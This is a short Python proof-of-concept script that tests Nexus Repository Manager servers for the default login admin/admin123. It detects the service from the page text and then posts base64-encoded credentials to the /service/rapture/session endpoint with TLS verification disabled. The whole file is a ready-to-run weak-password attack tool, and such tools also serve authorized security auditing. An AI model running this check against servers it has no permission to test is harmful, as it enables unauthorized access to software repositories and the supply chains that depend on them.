#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = carrypan

import requests

def poc(url):
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url    

    # 弱口令
    try:
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        r = requests.get(url, timeout=8, allow_redirects=True, verify=False)
        if "Nexus" in r.text:
            data = {
                "username": "YWRtaW4=",  # base64.b64encode("admin".encode()).decode(),
                "password": "YWRtaW4xMjM="  # base64.b64encode("admin123".encode()).decode()
            }
            r1 = requests.post(url + '/service/rapture/session', data=data, timeout=8, allow_redirects=False, verify=False)
            if r1.status_code == 204 or r1.status_code == 405:
                return '[nexus weakpass]\t' + url + '\tadmin/admin123'
            else:
                return "[dectect Nexus Repository Manager service]\t" + url
        else:
            return False
    except:
        return False